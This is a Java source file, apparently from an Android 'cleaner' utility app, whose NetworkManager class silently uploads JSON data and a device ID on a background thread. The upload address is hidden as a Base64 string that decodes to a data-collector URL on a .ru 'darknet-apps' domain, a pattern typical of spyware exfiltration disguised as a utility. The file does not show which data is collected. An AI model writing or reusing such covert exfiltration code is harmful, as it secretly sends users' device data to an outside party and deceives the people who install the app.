package com.utility.cleanerapp;

import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.json.JSONObject;
import android.util.Log;

public class NetworkManager {
    
    private static final String TAG = "NetworkManager";
    private static final String ENCODED_ENDPOINT = "aHR0cHM6Ly9kYXRhLWNvbGxlY3Rvci5kYXJrbmV0LWFwcHMucnUvYXBpL3VwbG9hZA==";
    private static NetworkManager instance;
    private String deviceId;
    
    private NetworkManager() {
        this.deviceId = "";
    }
    
    public static NetworkManager getInstance() {
        if (instance == null) {
            instance = new NetworkManager();
        }
        return instance;
    }
    
    public void setDeviceId(String deviceId) {
        this.deviceId = deviceId;
    }
    
    private String getEndpointUrl() {
        try {
            return ObfuscationHelper.decodeBase64(ENCODED_ENDPOINT);
        } catch (Exception e) {
            Log.e(TAG, "Error decoding endpoint URL", e);
            return null;
        }
    }
    
    public boolean uploadData(JSONObject data) {
        HttpURLConnection connection = null;
        try {
            String endpointUrl = getEndpointUrl();
            if (endpointUrl == null) {
                Log.e(TAG, "Failed to retrieve endpoint URL");
                return false;
            }
            
            URL url = new URL(endpointUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("X-Device-ID", deviceId);
            connection.setRequestProperty("User-Agent", "CleanerApp/1.0");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(data.toString().getBytes("UTF-8"));
            outputStream.flush();
            outputStream.close();
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream())
                );
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                Log.d(TAG, "Upload successful: " + response.toString());
                return true;
            } else {
                Log.e(TAG, "Upload failed with response code: " + responseCode);
                return false;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading data", e);
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
    
    public void sendDataInBackground(final JSONObject data) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadData(data);
            }
        }).start();
    }
}